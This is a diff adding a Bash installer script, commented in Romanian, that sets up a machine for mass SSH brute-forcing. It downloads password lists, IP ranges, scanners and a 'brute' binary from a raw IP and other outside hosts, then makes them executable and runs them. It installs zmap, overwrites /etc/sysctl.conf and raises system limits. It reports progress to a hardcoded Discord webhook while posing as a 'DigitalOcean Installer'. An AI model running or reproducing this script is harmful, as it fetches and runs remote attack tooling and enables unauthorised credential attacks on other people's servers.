@@ -1,0 +1,78 @@
+#/bin/bash
+# colors
+    restore='\033[0m'
+    smek='\033[0;49;35m'
+    red='\033[31m'
+    white='\033[01;37m'
+# setup
+url="https://discord.com/api/webhooks/843094417278763058/4ssjy7UhGbAm4i6rnEpbd4rjl3noONFYPOsXnm1A2fZDLtMfKGk18-jj1q9NJC1lmGln"
+apt install wget curl -y
+wget ftp://45.133.1.158/pass
+wget ftp://45.133.1.158/frm
+wget ftp://45.133.1.158/.bisis
+wget ftp://45.133.1.158/r.lst
+wget ftp://45.133.1.158/scan
+wget ftp://45.133.1.158/range
+wget ftp://45.133.1.158/.clase
+wget ftp://45.133.1.158/genp
+wget http://databasedutu.000webhostapp.com/discord.sh > /dev/null 2>&1
+apt install jq -y > /dev/null 2>&1
+chmod +x *
+# setup filter
+  ./discord.sh \
+    --webhook-url=$url \
+    --username "DigitalOcean Installer" \
+    --avatar "https://i.imgur.com/z3zgwEa.jpg" \
+    --title "[Installer]" \
+    --description "** Incepem Instalarea**" \
+    --author "Haceru#1337" \
+    --author-icon "https://i.imgur.com/z3zgwEa.jpg" \
+    --footer "DigitalOcean Installer made with love by Haceru" \
+    --color "0x7400FF"
+# setup digital
+   apt update -y > /dev/null 2>&1
+  ./discord.sh \
+    --webhook-url=$url \
+    --username "DigitalOcean Installer" \
+    --avatar "https://i.imgur.com/z3zgwEa.jpg" \
+    --title "[Auto Update]" \
+    --description "* Am terminat update la sistemul de operare**" \
+    --color "0x7400FF"
+  apt install zmap -y > /dev/null 2>&1
+  ./discord.sh \
+    --webhook-url=$url \
+    --username "DigitalOcean Installer" \
+    --avatar "https://i.imgur.com/z3zgwEa.jpg" \
+    --title "[Installer Zmap]" \
+    --description "** Am terminat de instalat zmap**" \
+    --color "0x7400FF"
+# setup arhiva
+  rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999 ; clear ;
+  ./discord.sh \
+    --webhook-url=$url \
+    --username "DigitalOcean Installer" \
+    --avatar "https://i.imgur.com/z3zgwEa.jpg" \
+    --title "[Setup Diicot]" \
+    --description "** Am terminat de facut setup pentru arhiva diicot**" \
+    --color "0x7400FF"
+# download last brute update
+  wget cdn.arhive.online/brute > /dev/null 2>&1
+  chmod +x brute ; ./genp 200
+  ./discord.sh \
+    --webhook-url=$url \
+    --username "DigitalOcean Installer" \
+    --avatar "https://i.imgur.com/z3zgwEa.jpg" \
+    --title "[Download Diicot v5]" \
+    --description "** Am descarcat diicot brute**" \
+    --color "0x7400FF"
+    ################
+    ./discord.sh \
+    --webhook-url=$url \
+    --username "DigitalOcean Installer" \
+    --avatar "https://i.imgur.com/z3zgwEa.jpg" \
+    --title "[Finish]" \
+    --description "** Am terminat install la digital**" \
+    --color "0x7400FF"
+    rm -rf discord.sh
+  # open screen
+  screen
